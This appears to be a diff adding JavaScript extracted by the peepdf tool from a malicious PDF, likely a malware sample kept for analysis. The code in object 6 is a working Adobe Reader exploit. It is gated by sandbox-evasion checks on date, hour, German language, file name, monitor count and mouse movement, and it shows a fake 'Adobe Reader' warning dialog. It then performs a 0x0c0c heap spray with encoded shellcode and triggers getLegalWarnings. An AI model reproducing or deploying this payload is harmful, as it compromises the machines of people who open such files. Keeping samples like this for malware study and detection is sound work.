@@ -1,0 +1,142 @@
+// peepdf comment: Javascript code located in object 6 (version 0)
+
+{
+    var date_flag = 0,
+        time_flag = 0;
+    var cur_date = util.printd("d.m.yy", new Date());
+    var cur_hr = util.printd("H", new Date());
+    if ("everyday".toLowerCase().replace(/ /g, "") == "everyday") {
+        date_flag = 1;
+    } else {
+        var arr = "everyday".split(",");
+        for (var i in arr) {
+            if (arr[i].replace(/ /g, "") == cur_date) {
+                date_flag = 1;
+                break;
+            }
+        }
+    }
+    if ("8,9,10,11,12,13,14,15,16".toLowerCase().replace(/ /g, "") == "anytime") {
+        time_flag = 1;
+    } else {
+        var arr = "8,9,10,11,12,13,14,15,16".split(",");
+        for (var i in arr) {
+            arr[i] = arr[i].replace(/ /g, "");
+            if (arr[i].indexOf(">=") >= 0) {
+                time_flag = 1;
+                // if any condition doesn't hold, don't proceed.
+                if (!(cur_hr >= parseInt(arr[i].split(">=")[1]))) {
+                    time_flag = 0;
+                    break;
+                }
+            } else if (arr[i].indexOf(">") >= 0) {
+                time_flag = 1;
+                // if any condition doesn't hold, don't proceed.
+                if (!(cur_hr > parseInt(arr[i].split(">")[1]))) {
+                    time_flag = 0;
+                    break;
+                }
+            }
+            if (arr[i].indexOf("<=") >= 0) {
+                time_flag = 1;
+                // if any condition doesn't hold, don't proceed.
+                if (!(cur_hr <= parseInt(arr[i].split("<=")[1]))) {
+                    time_flag = 0;
+                    break;
+                }
+            } else if (arr[i].indexOf("<") >= 0) {
+                time_flag = 1;
+                // if any condition doesn't hold, don't proceed.
+                if (!(cur_hr < parseInt(arr[i].split("<")[1]))) {
+                    time_flag = 0;
+                    break;
+                }
+            }
+            if (cur_hr == parseInt(arr[i])) {
+                time_flag = 1;
+                break;
+            }
+        }
+    }
+    if (date_flag && time_flag) {
+
+        var flag = 0;
+        var arr = "deu".split(",");
+        for (var i in arr) {
+            arr[i] = arr[i].toLowerCase().replace(/ /g, "");
+            if (arr[i] == app.language.toLowerCase()) {
+                flag = 1;
+                break;
+            }
+        }
+        if (flag) {
+
+            var flag = 0;
+            if (this.documentFileName == "andromeda_sun_853.pdf") flag = 1;
+            if (flag) {
+
+                var flag = 0;
+                // the first call initializes the obj!
+                app.monitors.toSource();
+                var len = app.monitors.length;
+                var arr = "2,3,4".split(",");
+                for (var i in arr) {
+                    if (len == parseInt(arr[i])) {
+                        flag = 1;
+                        break;
+                    }
+                }
+                if (flag) {
+
+                    var x = this.mouseX;
+                    var y = this.mouseY;
+                    while (x == this.mouseX || y == this.mouseY); {
+
+                        var resp = app.alert({
+                            cMsg: "This file has JavaScript and may harm your computer. Proceed?",
+                            nIcon: 0,
+                            nType: 3,
+                            cTitle: "Adobe Reader"
+                        });
+                        var resp_str = "yes";
+                        if (resp == 3) resp_str = "no";
+                        if (resp == 2) resp_str = "cancel";
+                        var flag = 0;
+                        var arr = "no, cancel".split(",");
+                        for (var i in arr) {
+                            arr[i] = arr[i].toLowerCase().replace(/ /g, "");
+                            if (arr[i] == resp_str) {
+                                flag = 1;
+                                break;
+                            }
+                        }
+                        if (flag) {
+
+                            // comment
+                            var shellcode = unescape("%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u13bd%u40af%udb23%ud9de%u2474%u5af4%uc933%u36b1%u6a31%u8313%ufcea%u6a03%u4d1c%u98b5%u626d%u6a35%u55ab%ue0e3%ua26f%u224c%ufba6%u0542%ue860%u8d1f%u136c%u5e78%u1221%u0387%uf28a%u2277%u643f%uf59d%u726c%u9530%u2171%u85e9%uebfd%u723d%u9601%u7d69%u51b3%uef43%u9aa5%u0214%ub7dd%u09be%u292a%u22a4%u2171%u9f13%u0e5b%ua25a%u8ce5%u3bd7%ue976%ud572%u5406%u44be%uf2df%u2001%ud0bd%u86a5%ucf0f%uc605%uf6aa%ua91f%u5e72%u1798%uf94f%uf164%ud80a%u98a1%u050c%u794b%uaa2a%u3d5d%ufe7f%ub4a3%u82fd%u4e2a%u436e%u2e03%u461e%ud5ce%ue025%uc0b3%u7f66%u62d2%u2efc%u58dd%ue137%ue045%u8b73%u4a6e%u73da%u55eb%ue928%ua70b%ub466%u9506%u22d8%u7497%u0cfd%u0c9d%uea38%uf791%u28af%ubd6f%ufbdf%uca5c%u5313%ubb15%u1cc0%u48ea%u6ca6%ub423%ud76f%u0c73%uf7a5%u4cbf");
+                            var c = unescape("%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c");
+                            while (c.length + 20 + 8 < 0x10000) c += c;
+                            b = c.substring(0, (0x0c0c - 0x24) / 2);
+                            b += shellcode;
+                            b += c;
+                            d = b.substring(0, 0x10000 / 2);
+                            while (d.length < 0x80000) d += d;
+                            var_3 = d.substring(0, 0x80000 - (0x1020 - 0x08) / 2);
+                            var var_4 = new Array();
+                            for (i = 0; i < 0x1f0; i++) var_4[i] = var_3 + "s";
+                            this.getLegalWarnings(true);
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+// peepdf comment: Javascript code located in object 9 (version 0)
+
+<? xml version = '1.0' ?> < xdp: xdp xmlns: xdp = 'http://ns.adobe.com/xdp/' > < config xmlns: xfa = 'http://www.xfa.org/schema/xci/3.0/' > < present > < pdf > < interactive > 1 < /interactive></pdf > < /present></config > < template xmlns: xfa = 'http://www.xfa.org/schema/xfa-template/3.0/' > < subform layout = 'tb'
+name = 'form1' > < pageSet / > < event activity = 'initialize'
+name = 'event__ready' > < script contentType = 'application/x-formcalc' > < /script></event > < subform > < field name = 'Button1' > < ui > < button highlight = 'inverted' / > < /ui><caption><value><text>Send!</text > < /value><para hAlign='center' vAlign='middle'/ > < /caption><bind match='none'/ > < event activity = 'click'
+name = 'event__click' > < script contentType = 'application/x-formcalc' > < /script></event > < /field><field name='TextField1'><ui><textEdit><border><edge stroke='lowered'/ > < /border></textEdit > < /ui></field > < /subform></subform > < /template><xfa:datasets xmlns:xfa='http:/ / www.xfa.org / schema / xfa - data / 1.0 / '><xfa:data><form1><TextField1>$host.messageBox("Greetings from Mars!")</TextField1></form1></xfa:data></xfa:datasets></xdp:xdp>
+
